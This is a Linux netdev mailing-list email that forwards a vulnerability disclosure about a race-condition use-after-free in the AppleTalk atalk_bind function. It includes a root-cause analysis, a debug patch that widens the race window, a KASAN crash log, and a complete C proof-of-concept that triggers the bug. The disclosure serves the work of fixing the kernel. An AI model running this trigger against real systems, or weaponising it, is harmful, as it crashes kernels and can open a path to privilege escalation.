Return-Path: <netdev+bounces-38740-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id A44AD7BC505
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:35:35 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 633142820FE
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:35:34 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DA4559CA5E;
	Sat,  7 Oct 2023 06:35:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A8DF89CA48
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:35:30 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id B6C2AB9
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:35:26 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976ZC8M021157;
	Sat, 7 Oct 2023 08:35:12 +0200
Date: Sat, 7 Oct 2023 08:35:12 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_bind of appletalk module
 leading to UAF
Message-ID: <20231007063512.GQ20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:08:44 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_bind of appletalk module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_bind, which leads to the kernel access free'd stalk_addr object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
> atalk_bind first obtains the lock of the sk, then it call atalk_find_primary to find the ap and use the ap.
> 
>   *   atalk_bind
> 
>      *   lock_sock(sk);
> 
>      *   struct atalk_addr *ap = atalk_find_primary();
> 
>         *   return the pointer of iface:&fiface->address
>      *   use ap :at->src_net = addr->sat_addr.s_net = ap->s_net;
> 
>      *   release_sock(sk);
> 
> atalk_find_primary will search for iface from the atalk_interfaces linked list and finally return &fiface->address
> 
> static struct atalk_addr *atalk_find_primary(void)
> {
>         struct atalk_iface *fiface = NULL;
>         struct atalk_addr *retval;
>         struct atalk_iface *iface;
> 
>         /*
>          * Return a point-to-point interface only if
>          * there is no non-ptp interface available.
>          */
>         read_lock_bh(&atalk_interfaces_lock);
>         for (iface = atalk_interfaces; iface; iface = iface->next) {
>                 if (!fiface && !(iface->dev->flags & IFF_LOOPBACK))
>                         fiface = iface;
>                 if (!(iface->dev->flags & (IFF_LOOPBACK | IFF_POINTOPOINT))) {
>                         retval = &iface->address;
>                         goto out;
>                 }
>         }
> 
>         if (fiface)
>                 retval = &fiface->address;
>         else if (atalk_interfaces)
>                 retval = &atalk_interfaces->address;
>         else
>                 retval = NULL;
> out:
>         read_unlock_bh(&atalk_interfaces_lock);
>         return retval;
> }
> 
> 
> iface can be free'd through ioctl(at_fd, SIOCDIFADDR, &atreq);.
> 
>   *   atalk_ioctl
> 
>      *   rtnl_lock();
> 
>      *   atalk_dev_down
> 
>         *   atif_drop_device
> 
>            *   kfree(tmp);
>      *   rtnl_unlock();
> 
> During the atalk_ioctl --> atif_drop_device process, only the rtnl lock is obtained. Inconsistency between the rtnl lock and the atalk_bind lock causes UAF.
> 
>                                                   Time
>                                                    +
>                                                    |
> thread A                                           |  thread B
> atalk_bind                                         |  ioctl --> atalk_dev_down
>                                                    |
>                                                    |
>   1.struct atalk_addr *ap = atalk_find_primary()   |
>                                                    |
>                                                    |
>                                                    |     2.atif_drop_device(dev)  --> free ap
>                                                    |
>                                                    |
>     // UAF!                                        |
>   3.addr->sat_addr.s_net = ap->s_net;              |
>                                                    +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_addr
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( atalk_bind ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From b17fda105378e1f34cf3e27a961ad26fc1ccd100 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 17:12:06 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_bind
> 
> add some loop for race.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 17 +++++++++++++++++
>  1 file changed, 17 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..a7a43a0dcea4 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -1134,6 +1134,19 @@ static int atalk_autobind(struct sock *sk)
>         return n;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> +
>  /* Set the address 'our end' of the connection */
>  static int atalk_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
>  {
> @@ -1157,8 +1170,12 @@ static int atalk_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
>                 if (!ap)
>                         goto out;
> 
> +               printk("vuln: [atalk_bind] %llx\n", (uint64_t)ap);
> +               dxxx();
> +
>                 at->src_net  = addr->sat_addr.s_net = ap->s_net;
>                 at->src_node = addr->sat_addr.s_node = ap->s_node;
> +               printk("vuln: [atalk_bind] after use %llx\n", (uint64_t)ap);
>         } else {
>                 err = -EADDRNOTAVAIL;
>                 if (!atalk_find_interface(addr->sat_addr.s_net,
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> # /tmp/atalk_search_socket
> fd: 3
> [15244.076820] vuln: [atalk_bind] ffff8880079f4748
> [15244.504286] ==================================================================
> [15244.504882] BUG: KASAN: slab-use-after-free in atalk_bind+0x198/0x3d0 [appletalk]
> [15244.505447] Read of size 2 at addr ffff8880079f4748 by task atalk_search_so/240
> [15244.505974]
> [15244.506102] CPU: 1 PID: 240 Comm: atalk_search_so Tainted: G           OE      6.5.0-rc5 #7
> [15244.506695] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [15244.507325] Call Trace:
> [15244.507507]  <TASK>
> [15244.507670]  dump_stack_lvl+0x4c/0x70
> [15244.507961]  print_report+0xd3/0x620
> [15244.508237]  ? kasan_complete_mode_report_info+0x7d/0x200
> [15244.508626]  ? atalk_bind+0x198/0x3d0 [appletalk]
> [15244.508980]  kasan_report+0xc2/0x100
> [15244.509240]  ? atalk_bind+0x198/0x3d0 [appletalk]
> [15244.509591]  __asan_load2+0x7d/0xb0
> [15244.509846]  atalk_bind+0x198/0x3d0 [appletalk]
> [15244.510181]  ? apparmor_socket_bind+0x2f/0x40
> [15244.510512]  __sys_bind+0x19f/0x1c0
> [15244.510778]  ? __pfx___sys_bind+0x10/0x10
> [15244.511074]  ? __kasan_check_write+0x18/0x20
> [15244.511389]  ? kfree+0x7a/0x120
> [15244.511634]  ? __kasan_check_read+0x15/0x20
> [15244.511932]  ? fpregs_assert_state_consistent+0x62/0x70
> [15244.512315]  ? exit_to_user_mode_prepare+0x3d/0x190
> [15244.512679]  __x64_sys_bind+0x47/0x60
> [15244.512950]  do_syscall_64+0x60/0x90
> [15244.513218]  ? syscall_exit_to_user_mode+0x2a/0x50
> [15244.513567]  ? ret_from_fork+0x2d/0x70
> [15244.513847]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [15244.514245] RIP: 0033:0x46054b
> [15244.514492] Code: 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 31 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
> [15244.515817] RSP: 002b:00007fbd78928d78 EFLAGS: 00000246 ORIG_RAX: 0000000000000031
> [15244.516379] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000046054b
> [15244.516895] RDX: 0000000000000010 RSI: 00007fbd78928d90 RDI: 0000000000000003
> [15244.517417] RBP: 00007fbd78928db0 R08: 0000000000000000 R09: 00007fbd78929700
> [15244.517940] R10: 00007fbd789299d0 R11: 0000000000000246 R12: 00007ffc941dd58e
> [15244.518459] R13: 00007ffc941dd58f R14: 00007ffc941dd590 R15: 00007fbd78928e80
> [15244.519007]  </TASK>
> [15244.519178]
> [15244.519301] Allocated by task 238:
> [15244.519563]  kasan_save_stack+0x2a/0x50
> [15244.519904]  kasan_set_track+0x29/0x40
> [15244.520184]  kasan_save_alloc_info+0x1f/0x30
> [15244.520499]  __kasan_kmalloc+0xb5/0xc0
> [15244.520777]  kmalloc_trace+0x4e/0xb0
> [15244.521044]  atif_ioctl+0x900/0xaf0 [appletalk]
> [15244.521388]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [15244.521739]  sock_do_ioctl+0xb9/0x1a0
> [15244.522015]  sock_ioctl+0x1b1/0x420
> [15244.522280]  __x64_sys_ioctl+0xd1/0x110
> [15244.522565]  do_syscall_64+0x60/0x90
> [15244.522827]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [15244.523195]
> [15244.523314] Freed by task 239:
> [15244.523543]  kasan_save_stack+0x2a/0x50
> [15244.523818]  kasan_set_track+0x29/0x40
> [15244.524091]  kasan_save_free_info+0x2f/0x50
> [15244.524390]  __kasan_slab_free+0x12e/0x1c0
> [15244.524684]  __kmem_cache_free+0x1b9/0x380
> [15244.524981]  kfree+0x7a/0x120
> [15244.525203]  atif_drop_device+0xad/0x100 [appletalk]
> [15244.525574]  atif_ioctl+0x1f5/0xaf0 [appletalk]
> [15244.525917]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [15244.526259]  sock_do_ioctl+0xb9/0x1a0
> [15244.526542]  sock_ioctl+0x1b1/0x420
> [15244.526804]  __x64_sys_ioctl+0xd1/0x110
> [15244.527090]  do_syscall_64+0x60/0x90
> [15244.527353]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [15244.527708]
> [15244.527828] The buggy address belongs to the object at ffff8880079f4740
> [15244.527828]  which belongs to the cache kmalloc-32 of size 32
> [15244.528697] The buggy address is located 8 bytes inside of
> [15244.528697]  freed 32-byte region [ffff8880079f4740, ffff8880079f4760)
> [15244.529545]
> [15244.529666] The buggy address belongs to the physical page:
> [15244.530066] page:00000000b8b37d3c refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x79f4
> [15244.530742] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [15244.531244] page_type: 0xffffffff()
> [15244.531524] raw: 000fffffc0000200 ffff888006842500 dead000000000100 dead000000000122
> [15244.532079] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
> [15244.532639] page dumped because: kasan: bad access detected
> [15244.533040]
> [15244.533160] Memory state around the buggy address:
> [15244.533511]  ffff8880079f4600: fb fb fb fb fc fc fc fc fb fb fb fb fc fc fc fc
> [15244.534037]  ffff8880079f4680: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
> [15244.534564] >ffff8880079f4700: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [15244.535086]                                               ^
> [15244.535493]  ffff8880079f4780: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
> [15244.536015]  ffff8880079f4800: 00 00 00 02 fc fc fc fc fb fb fb fb fc fc fc fc
> [15244.536534] ==================================================================
> [15244.537085] Disabling lock debugging due to kernel taint
> [15244.537478] vuln: [atalk_bind] after use ffff8880079f4748
> use done
> #
> 
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
>   usleep(15000);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
> 
>   struct sockaddr_at addr = {0};
>   addr.sat_family = AF_APPLETALK;           // ?????
>   addr.sat_addr.s_net == htons(ATADDR_ANYNET); // ????
>   addr.sat_port == 0;
>   int bind_res = bind(at_fd, (struct sockaddr *)&addr, sizeof(addr));
> 
>   puts("use done");
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt2() {
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "lo"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_PPPTALK));
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_PPPTALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_X25);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
> 
>   // Close the socket
>   close(sockfd);
> 
>   return 0;
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt() {
>   // ???????
>   int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_X25));
>   if (sockfd == -1) {
>     perror("Socket creation failed");
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??socket????
>   struct sockaddr_ll sa;
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = AF_PACKET;
>   sa.sll_protocol = htons(ETH_P_X25);
> 
>   // ??????
>   sa.sll_ifindex = if_nametoindex("eth0");
>   if (sa.sll_ifindex == 0) {
>     perror("Interface not found");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   // ??X.25???
>   char packet[] = {0x00, 0x00, 0x00, 0x00, // X.25?
>                    // ??X.25?????
>                    0x11, 0x22, 0x33};
> 
>   // ?????
>   if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sa,
>              sizeof(struct sockaddr_ll)) == -1) {
>     perror("Packet sending failed");
>     close(sockfd);
>     exit(EXIT_FAILURE);
>   }
> 
>   printf("Packet sent successfully\n");
> 
>   // ?????
>   close(sockfd);
> 
>   return 0;
> }
> 
> int main() {
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
> 
> 
> 
> //   send_pkt2();
> 
> //   return;
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

